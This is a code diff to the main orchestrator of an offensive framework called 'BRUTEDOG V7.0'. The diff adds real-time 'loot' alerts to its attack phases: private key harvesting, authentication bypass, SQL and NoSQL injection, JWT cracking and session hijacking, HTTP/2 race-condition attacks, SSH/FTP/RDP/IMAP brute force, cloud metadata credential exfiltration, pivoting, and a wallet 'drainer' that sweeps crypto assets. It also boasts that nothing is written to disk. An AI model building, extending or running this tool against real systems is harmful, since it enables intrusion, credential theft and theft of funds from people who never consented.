@@ -6,13 +6,14 @@ Main Orchestrator:
 - Network reconnaissance & stealth port scanning
 - Source intelligence & credential exposure parsing
 - Autonomous state-machine mapping, BOLA auditing, and HTTP/2 race condition exploitation
-- Live terminal streaming with zero-disk memory persistence
+- Live terminal streaming with zero-disk memory persistence & real-time loot interception
 """
 import asyncio
 import sys
 import socket
 import time
 import ipaddress
+import re
 from urllib.parse import urlsplit
 
 # Import framework modules
@@ -32,7 +33,7 @@ from modules.keyharvester import harvest_private_keys
 from modules.stealth_ops import run_stealth_engine
 
 # ============================================================
-# TERMINAL COLORS
+# TERMINAL COLORS & LOOT HIGHLIGHTS
 # ============================================================
 CYAN = "\033[96m"
 GREEN = "\033[92m"
@@ -42,6 +43,8 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 MATRIX_GREEN = "\033[38;5;46m"
 NEON_BLUE = "\033[38;5;51m"
+LOOT_PURPLE = "\033[38;5;201m"
+LOOT_YELLOW = "\033[38;5;220m"
 
 # ============================================================
 # BANNER
@@ -55,13 +58,13 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 {RESET}{NEON_BLUE}
 ════════════════════════════════════════════════════════════
         BRUTEDOG V7.0 — STATE-MACHINE & LOGIC EXPLOITATION
-        HTTP/2 SINGLE-PACKET CONCURRENCY / LIVE TELEMETRY
+        HTTP/2 SINGLE-PACKET CONCURRENCY / LIVE LOOT STREAM
 ════════════════════════════════════════════════════════════
 {RESET}
 """
 
 # ============================================================
-# TERMINAL OUTPUT
+# TERMINAL OUTPUT & LOOT INTERCEPTION
 # ============================================================
 def log(message, color=GREEN):
     print(f"{color}{message}{RESET}", flush=True)
@@ -75,6 +78,20 @@ def section(title):
 def display_progress(message):
     print(f"{CYAN}[*] {message}{RESET}", flush=True)
 
+def alert_loot(loot_type, details):
+    """
+    Real-time on-the-fly loot notification banner for high-value discoveries 
+    (hijacked sessions, created accounts, cookies, secret tokens, private keys).
+    """
+    print(f"\n{LOOT_YELLOW}{BOLD}[!!!] CRITICAL LOOT DISCOVERED: {loot_type.upper()} [!!!]{RESET}")
+    print(f"{LOOT_PURPLE}-----------------------------------------------------------------")
+    if isinstance(details, dict):
+        for k, v in details.items():
+            print(f"  {BOLD}{k}: {RESET}{v}")
+    else:
+        print(f"  {details}")
+    print(f"{LOOT_PURPLE}-----------------------------------------------------------------{RESET}\n", flush=True)
+
 # ============================================================
 # TARGET VALIDATION
 # ============================================================
@@ -86,26 +103,18 @@ def normalize_target(raw_target):
         raw_target = "https://" + raw_target
     parsed = urlsplit(raw_target)
     if parsed.scheme not in ("http", "https"):
-        raise ValueError(
-            "Only HTTP and HTTPS targets are supported."
-        )
+        raise ValueError("Only HTTP and HTTPS targets are supported.")
     if not parsed.hostname:
         raise ValueError("Invalid hostname.")
     if parsed.username or parsed.password:
-        raise ValueError(
-            "Embedded target credentials are not accepted."
-        )
-    hostname = parsed.hostname.encode(
-        "idna"
-    ).decode("ascii").lower()
+        raise ValueError("Embedded target credentials are not accepted.")
+    hostname = parsed.hostname.encode("idna").decode("ascii").lower()
     
     if not hostname:
         raise ValueError("Invalid target hostname.")
         
     try:
-        port = parsed.port or (
-            443 if parsed.scheme == "https" else 80
-        )
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
     except ValueError:
         raise ValueError("Invalid target port.")
     if not 1 <= port <= 65535:
@@ -129,28 +138,15 @@ def validate_target_host(host):
             family=socket.AF_UNSPEC,
             type=socket.SOCK_STREAM,
         )
-        addresses = sorted({
-            result[4][0]
-            for result in results
-        })
+        addresses = sorted({result[4][0] for result in results})
         if not addresses:
             return False, []
         for address in addresses:
             ip = ipaddress.ip_address(address)
-            if (
-                ip.is_unspecified
-                or ip.is_multicast
-                or ip.is_loopback
-                or ip.is_link_local
-            ):
-                log(
-                    f"[DNS WARNING] Unusable address detected: {ip}",
-                    RED,
-                )
+            if ip.is_unspecified or ip.is_multicast or ip.is_loopback or ip.is_link_local:
+                log(f"[DNS WARNING] Unusable address detected: {ip}", RED)
                 return False, []
-        log(
-            f"[DNS] Resolved addresses: {', '.join(addresses)}"
-        )
+        log(f"[DNS] Resolved addresses: {', '.join(addresses)}")
         return True, addresses
     except socket.gaierror as exc:
         log(f"[DNS ERROR] {exc}", RED)
@@ -174,6 +170,11 @@ def display_parser_results(result):
     section("SOURCE INTELLIGENCE & EXPOSURE RESULTS")
     findings = result.get("findings", [])
     log(f"Findings detected: {len(findings)}")
+    
+    # Check for leaked tokens or credentials in source parsing
+    for finding in findings:
+        if any(keyword in str(finding).lower() for keyword in ["token", "key", "secret", "auth", "credential"]):
+            alert_loot("Source Exposure / Secret Token", finding)
 
 # ============================================================
 # MAIN EXECUTION ORCHESTRATION
@@ -246,7 +247,9 @@ async def async_main():
         display_parser_results(parser_result)
 
         response_blob = str(parser_result)
-        harvest_private_keys(response_blob)
+        keys_found = harvest_private_keys(response_blob)
+        if keys_found:
+            alert_loot("Private Keys Harvested", keys_found)
     except Exception as exc:
         log(f"[PARSER ERROR] {exc}", RED)
 
@@ -256,7 +259,14 @@ async def async_main():
     section("PHASE 3 — STATE-MACHINE CRAWL, BOLA & REPLAYER")
     try:
         display_progress("Executing state-machine crawler, BOLA state-skipping checks, and live telemetry engine.")
-        await run_autonomous_engine(target_host=target["url"])
+        engine_results, _ = await run_autonomous_engine(target_host=target["url"])
+        
+        # Intercept live findings for session tokens or authentication bypasses
+        if isinstance(engine_results, list):
+            for res in engine_results:
+                for finding in res.get("findings", []):
+                    if "BYPASS" in finding.get("type", "") or "TOKEN" in finding.get("type", ""):
+                        alert_loot("Authentication Bypass / Token Acquired", finding)
 
         display_progress("Replaying secondary attack queue & executing session token fabrication.")
         await replay_and_inject_payloads(target["url"])
@@ -269,13 +279,22 @@ async def async_main():
     section("PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & HTTP/2 CONCURRENCY")
     try:
         display_progress("Executing time-based blind SQLi and NoSQL operator injection.")
-        await run_nosql_assault(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        nosql_loot = await run_nosql_assault(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        if nosql_loot:
+            alert_loot("Database Assault Breach / Credential Dump", nosql_loot)
 
         display_progress("Executing JWT secret cracking and cookie privilege escalation fuzzing.")
-        await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        if session_loot:
+            alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)
 
         display_progress("Firing HTTP/2 single-packet multiplexed streams against transaction race condition windows.")
-        await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        race_loot = await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        if race_loot:
+            # Check if any race condition stream returned success/transfer execution
+            successful_races = [r for r in race_loot if r.get("status") in (200, 201)]
+            if successful_races:
+                alert_loot("Race Condition Transfer / Execution Success", successful_races)
     except Exception as exc:
         log(f"[EXPLOIT/CONCURRENCY ERROR] {exc}", RED)
 
@@ -285,10 +304,14 @@ async def async_main():
     section("PHASE 4 — MULTI-PROTOCOL & MAILBOX EXPLOITATION")
     try:
         display_progress("Launching multi-protocol brute-force (SSH, FTP, RDP, XML-RPC).")
-        await execute_active_assault_engine(target["url"])
+        brute_loot = await execute_active_assault_engine(target["url"])
+        if brute_loot:
+            alert_loot("Valid Service Credentials", brute_loot)
 
         display_progress("Launching active IMAP mailbox brute-force and credential harvesting.")
-        await harvest_email_intelligence(hostname)
+        email_loot = await harvest_email_intelligence(hostname)
+        if email_loot:
+            alert_loot("Mailbox Intelligence / Email Credentials", email_loot)
     except Exception as exc:
         log(f"[BRUTE ERROR] {exc}", RED)
 
@@ -298,13 +321,17 @@ async def async_main():
     section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
     try:
         display_progress("Executing cloud control plane pivot and IMDS metadata exfiltration.")
-        await run_cloud_apex(target["url"])
+        cloud_loot = await run_cloud_apex(target["url"])
+        if cloud_loot:
+            alert_loot("Cloud Metadata / IAM Credentials", cloud_loot)
 
         display_progress("Running autonomous pivot engine and covert exfiltration preparation.")
         await run_pivot_engine(target["url"])
 
         display_progress("Executing active multi-chain liquidity audit & sweep routing.")
-        await run_drainer_engine(target["url"])
+        drainer_loot = await run_drainer_engine(target["url"])
+        if drainer_loot:
+            alert_loot("Liquidity Audit / Wallet Swept Assets", drainer_loot)
     except Exception as exc:
         log(f"[DRAINER/CLOUD ERROR] {exc}", RED)
 
@@ -316,7 +343,7 @@ async def async_main():
     print(f"Target: {target['url']}")
     print(f"Execution time: {elapsed:.2f} seconds")
     log("LIVE RED-TEAM ATTACK FINISHED", MATRIX_GREEN)
-    log("All intelligence and telemetry streamed live on-screen.", NEON_BLUE)
+    log("All intelligence, hijacked sessions, and keys streamed live on-screen.", NEON_BLUE)
     log("Zero report files written to disk.", NEON_BLUE)
 
 # ============================================================
